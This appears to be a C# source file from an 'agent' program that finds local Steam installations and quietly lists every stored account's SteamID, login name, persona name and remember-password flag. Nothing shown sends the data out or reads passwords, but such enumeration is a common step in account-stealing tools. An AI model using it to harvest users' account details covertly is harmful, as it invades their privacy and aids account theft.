using Microsoft.Win32;
using System.Globalization;
using System.Text.RegularExpressions;

namespace Vorken.Agent;

internal static class SteamAccountCollector
{
    private const ulong SteamId64Base = 76561197960265728UL;

    private static readonly Regex SteamIdBlockRegex =
        new("^\\s*\"(?<id>\\d{17})\"\\s*$", RegexOptions.Compiled);

    private static readonly Regex VdfPairRegex =
        new("^\\s*\"(?<key>[^\"]+)\"\\s*\"(?<value>[^\"]*)\"\\s*$", RegexOptions.Compiled);

    public static List<SteamAccountRecord> Collect()
    {
        var accounts =
            new Dictionary<string, SteamAccountRecord>(
                StringComparer.Ordinal);

        foreach (string steamRoot in DiscoverSteamRoots())
        {
            ReadLoginUsers(
                Path.Combine(steamRoot, "config", "loginusers.vdf"),
                accounts);

            ReadUserData(
                Path.Combine(steamRoot, "userdata"),
                accounts);
        }

        return accounts.Values
            .Where(item =>
                Regex.IsMatch(
                    item.SteamId64,
                    "^7656119\\d{10}$"))
            .OrderByDescending(item => item.MostRecent)
            .ThenByDescending(item => item.LastSeenUtc ?? DateTime.MinValue)
            .ThenBy(item => item.SteamId64, StringComparer.Ordinal)
            .Take(100)
            .ToList();
    }

    private static IEnumerable<string> DiscoverSteamRoots()
    {
        var paths =
            new HashSet<string>(
                StringComparer.OrdinalIgnoreCase);

        AddRegistryPath(
            paths,
            Registry.CurrentUser,
            @"Software\Valve\Steam",
            "SteamPath");

        try
        {
            using RegistryKey localMachine64 =
                RegistryKey.OpenBaseKey(
                    RegistryHive.LocalMachine,
                    RegistryView.Registry64);

            AddRegistryPath(
                paths,
                localMachine64,
                @"SOFTWARE\Valve\Steam",
                "InstallPath");
        }
        catch
        {
        }

        try
        {
            using RegistryKey localMachine32 =
                RegistryKey.OpenBaseKey(
                    RegistryHive.LocalMachine,
                    RegistryView.Registry32);

            AddRegistryPath(
                paths,
                localMachine32,
                @"SOFTWARE\Valve\Steam",
                "InstallPath");
        }
        catch
        {
        }

        AddCandidate(
            paths,
            Path.Combine(
                Environment.GetFolderPath(
                    Environment.SpecialFolder.ProgramFilesX86),
                "Steam"));

        AddCandidate(
            paths,
            Path.Combine(
                Environment.GetFolderPath(
                    Environment.SpecialFolder.ProgramFiles),
                "Steam"));

        return paths
            .Where(Directory.Exists)
            .Distinct(StringComparer.OrdinalIgnoreCase);
    }

    private static void AddRegistryPath(
        HashSet<string> paths,
        RegistryKey root,
        string keyPath,
        string valueName)
    {
        try
        {
            using RegistryKey? key =
                root.OpenSubKey(keyPath);

            AddCandidate(
                paths,
                Convert.ToString(
                    key?.GetValue(valueName)));
        }
        catch
        {
        }
    }

    private static void AddCandidate(
        HashSet<string> paths,
        string? value)
    {
        string normalized =
            String(value)
                .Replace('/', Path.DirectorySeparatorChar)
                .Trim()
                .Trim('"');

        if (normalized.Length == 0)
            return;

        try
        {
            normalized =
                Path.GetFullPath(normalized);
        }
        catch
        {
            return;
        }

        paths.Add(normalized);
    }

    private static void ReadLoginUsers(
        string filePath,
        Dictionary<string, SteamAccountRecord> accounts)
    {
        if (!File.Exists(filePath))
            return;

        string? currentSteamId = null;

        foreach (string rawLine in File.ReadLines(filePath))
        {
            Match block =
                SteamIdBlockRegex.Match(rawLine);

            if (block.Success)
            {
                currentSteamId =
                    block.Groups["id"].Value;

                SteamAccountRecord account =
                    GetOrCreate(
                        accounts,
                        currentSteamId);

                account.SavedLogin = true;
                AddSource(
                    account,
                    "loginusers.vdf");
                continue;
            }

            if (currentSteamId is null)
                continue;

            Match pair =
                VdfPairRegex.Match(rawLine);

            if (!pair.Success)
                continue;

            SteamAccountRecord current =
                GetOrCreate(
                    accounts,
                    currentSteamId);

            string key =
                pair.Groups["key"].Value;

            string value =
                pair.Groups["value"].Value;

            switch (key.ToLowerInvariant())
            {
                case "accountname":
                    current.AccountName = value;
                    break;

                case "personaname":
                    current.PersonaName = value;
                    break;

                case "mostrecent":
                    current.MostRecent =
                        value == "1" ||
                        value.Equals(
                            "true",
                            StringComparison.OrdinalIgnoreCase);
                    break;

                case "rememberpassword":
                    current.RememberPassword =
                        value == "1" ||
                        value.Equals(
                            "true",
                            StringComparison.OrdinalIgnoreCase);
                    break;

                case "timestamp":
                    if (long.TryParse(
                        value,
                        NumberStyles.Integer,
                        CultureInfo.InvariantCulture,
                        out long timestamp) &&
                        timestamp > 0)
                    {
                        try
                        {
                            current.LastSeenUtc =
                                DateTimeOffset
                                    .FromUnixTimeSeconds(timestamp)
                                    .UtcDateTime;
                        }
                        catch
                        {
                        }
                    }
                    break;
            }
        }
    }

    private static void ReadUserData(
        string userDataPath,
        Dictionary<string, SteamAccountRecord> accounts)
    {
        if (!Directory.Exists(userDataPath))
            return;

        IEnumerable<string> directories;

        try
        {
            directories =
                Directory.EnumerateDirectories(
                    userDataPath);
        }
        catch
        {
            return;
        }

        foreach (string directory in directories)
        {
            string name =
                Path.GetFileName(directory);

            if (!ulong.TryParse(
                name,
                NumberStyles.None,
                CultureInfo.InvariantCulture,
                out ulong accountId))
            {
                continue;
            }

            if (accountId == 0 ||
                accountId > uint.MaxValue)
            {
                continue;
            }

            ulong steamId64 =
                SteamId64Base + accountId;

            string steamId =
                steamId64.ToString(
                    CultureInfo.InvariantCulture);

            SteamAccountRecord account =
                GetOrCreate(
                    accounts,
                    steamId);

            account.AccountId =
                accountId.ToString(
                    CultureInfo.InvariantCulture);

            account.UserDataPresent = true;

            AddSource(
                account,
                "userdata");

            try
            {
                DateTime lastWriteUtc =
                    Directory.GetLastWriteTimeUtc(
                        directory);

                if (
                    lastWriteUtc.Year > 2000 &&
                    (
                        account.LastSeenUtc is null ||
                        lastWriteUtc >
                            account.LastSeenUtc.Value
                    )
                )
                {
                    account.LastSeenUtc =
                        lastWriteUtc;
                }
            }
            catch
            {
            }
        }
    }

    private static SteamAccountRecord GetOrCreate(
        Dictionary<string, SteamAccountRecord> accounts,
        string steamId64)
    {
        if (accounts.TryGetValue(
            steamId64,
            out SteamAccountRecord? existing))
        {
            return existing;
        }

        ulong accountId = 0;

        if (ulong.TryParse(
            steamId64,
            NumberStyles.None,
            CultureInfo.InvariantCulture,
            out ulong parsedSteamId) &&
            parsedSteamId >= SteamId64Base)
        {
            accountId =
                parsedSteamId - SteamId64Base;
        }

        var created =
            new SteamAccountRecord
            {
                SteamId64 = steamId64,
                AccountId =
                    accountId > 0
                        ? accountId.ToString(
                            CultureInfo.InvariantCulture)
                        : "",
                ProfileUrl =
                    "https://steamcommunity.com/profiles/" +
                    steamId64
            };

        accounts[steamId64] =
            created;

        return created;
    }

    private static void AddSource(
        SteamAccountRecord account,
        string source)
    {
        if (!account.Sources.Contains(
            source,
            StringComparer.OrdinalIgnoreCase))
        {
            account.Sources.Add(source);
        }
    }

    private static string String(
        string? value)
    {
        return value ?? "";
    }
}

internal sealed class SteamAccountRecord
{
    public string SteamId64 { get; set; } = "";
    public string AccountId { get; set; } = "";
    public string AccountName { get; set; } = "";
    public string PersonaName { get; set; } = "";
    public string ProfileUrl { get; set; } = "";
    public bool SavedLogin { get; set; }
    public bool UserDataPresent { get; set; }
    public bool MostRecent { get; set; }
    public bool RememberPassword { get; set; }
    public DateTime? LastSeenUtc { get; set; }
    public List<string> Sources { get; set; } = new();
}
